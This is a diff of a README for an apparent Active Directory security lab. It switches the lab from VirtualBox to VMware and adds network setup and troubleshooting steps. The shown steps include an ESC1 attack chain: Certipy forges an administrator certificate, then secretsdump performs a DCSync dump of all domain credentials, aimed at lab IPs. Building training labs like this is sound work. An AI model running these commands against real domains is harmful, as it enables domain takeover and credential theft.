@@ -12,23 +12,24 @@ Before starting, ensure you have the following installed on your host:
 
 ### Required Software
 
-1. **VirtualBox** (6.1 or later)
+1. **VMware Workstation/Desktop** (16.0 or later)
    ```bash
    # Ubuntu/Debian
-   sudo apt-get update
-   sudo apt-get install virtualbox
+   # Download from VMware website or use:
+   sudo apt-get install vmware-workstation
    
-   # macOS (using Homebrew)
-   brew install --cask virtualbox
+   # macOS
+   # Download VMware Fusion from VMware website
    ```
 
-2. **Vagrant** (2.3.0 or later)
+2. **Vagrant** (2.3.0 or later) with VMware plugin
    ```bash
-   # Ubuntu/Debian
-   sudo apt-get install vagrant
+   # Install Vagrant
+   sudo apt-get install vagrant  # Ubuntu/Debian
+   brew install vagrant          # macOS
    
-   # macOS (using Homebrew)
-   brew install vagrant
+   # Install VMware Vagrant plugin
+   vagrant plugin install vagrant-vmware-desktop
    ```
 
 3. **Ansible** (2.10 or later)
@@ -86,6 +87,25 @@ vagrant up
 
 **⏱️ First run takes 30-60 minutes** depending on your internet speed and hardware.
 
+### 3b. First-time setup (VMware only)
+
+VMware does not auto-configure the private network on Windows VMs. Ansible will fail with "No route to host" until those IPs are set.
+
+1. **Bootstrap network** (configures DC and Win10 via forwarded WinRM):
+   ```bash
+   ./scenario-1/scripts/bootstrap-network.sh
+   ```
+2. **If CA fails** ("Connection reset by peer"): open the **CA** VM (VMware console or RDP), run PowerShell as Administrator, then:
+   ```powershell
+   # Copy or paste from scenario-1/scripts/configure-network-ca.ps1
+   & "C:\path\to\Proj\scenario-1\scripts\configure-network-ca.ps1"
+   ```
+   Or run the script contents manually (see `scenario-1/scripts/configure-network-ca.ps1`).
+3. **Run provision:**
+   ```bash
+   cd scenario-1/infra/vagrant && vagrant provision
+   ```
+
 ### 4. Wait for Provisioning
 
 The setup is fully automated. You'll see Ansible playbooks running automatically. Wait until you see:
@@ -113,10 +133,10 @@ vagrant ssh attacker
 certipy req -u jdoe@serini.lab -p 'Summer2024!' -ca SERINI-CA -target ca.serini.lab -template VulnUserAuth -upn administrator@serini.lab
 
 # Step 2: Authenticate with certificate and get hash
-certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
+certipy auth -pfx administrator.pfx -dc-ip 192.168.58.10
 
 # Step 3: DCSync - Dump all domain credentials
-secretsdump.py -hashes :HASH_FROM_STEP_2 administrator@192.168.56.10
+secretsdump.py -hashes :HASH_FROM_STEP_2 administrator@192.168.58.10
 ```
 
 Replace `HASH_FROM_STEP_2` with the NT hash you received in step 2.
@@ -127,21 +147,21 @@ Replace `HASH_FROM_STEP_2` with the NT hash you received in step 2.
 ┌─────────────────────┐
 │   Domain Controller │
 │   (dc.serini.lab)   │
-│   192.168.56.10     │
+│   192.168.58.10     │
 └──────────┬──────────┘
            │
            │
 ┌──────────┴──────────┐       ┌─────────────────────┐
 │        CA           │       │   Windows 10 Client │
 │  (ca.serini.lab)    │       │  (win10.serini.lab) │
-│  192.168.56.20      │       │   192.168.56.40     │
+│  192.168.58.20      │       │   192.168.58.40     │
 └─────────────────────┘       └─────────────────────┘
            │
            │
 ┌──────────┴──────────┐
 │   Kali Attacker     │
 │     (attacker)      │
-│   192.168.56.100    │
+│   192.168.58.50     │
 └─────────────────────┘
 ```
 
@@ -241,12 +261,34 @@ ansible-playbook -i inventory.yml playbooks/06-esc1-template.yml
 ### VMs Not Starting
 
 ```bash
-# Check VirtualBox is running
-vboxmanage list vms
+# Check VMware VMs
+vmrun list
 
-# Restart VirtualBox service (Linux)
-sudo systemctl restart virtualbox
+# Or use Vagrant status
+vagrant status
 ```
+
+### VMware Network Configuration Issue
+
+VMware cannot auto-configure secondary network adapters on Windows VMs. You'll need to manually set static IPs:
+
+**On each Windows VM (DC, CA, Win10)**, open PowerShell as Administrator and run:
+
+```powershell
+# DC: 192.168.58.10
+$adapter = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -Last 1
+New-NetIPAddress -InterfaceIndex $adapter.ifIndex -IPAddress 192.168.58.10 -PrefixLength 24
+Set-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex -ServerAddresses 192.168.58.10
+
+# CA: Change IP to 192.168.58.20
+# Win10: Change IP to 192.168.58.40
+```
+
+Alternatively, use the provided scripts in `scenario-1/scripts/configure-network-*.ps1`.
+
+After configuring networks, run: `vagrant provision attacker`
+
+**Provisioning order:** `00-network.yml` runs first (static IPs + DNS on Windows). If Ansible cannot reach Windows hosts (e.g. before manual network config), that playbook will fail—configure networks manually, then run `vagrant provision` again.
 
 ### Ansible Connection Errors
 
@@ -254,6 +296,10 @@ sudo systemctl restart virtualbox
 # Test WinRM connectivity
 ansible dc -i scenario-1/infra/ansible/inventory.yml -m win_ping
 ```
+
+### GPO / "Not associated with Active Directory domain or forest"
+
+If `03-software-gpo` fails with that error, the playbook now uses `-Domain serini.lab` for Get-GPO/New-GPO. Ensure `01-domain` and `02-adcs` have completed (including reboots) before `03-software-gpo` runs.
 
 ### ESC1 Exploitation Failing
 
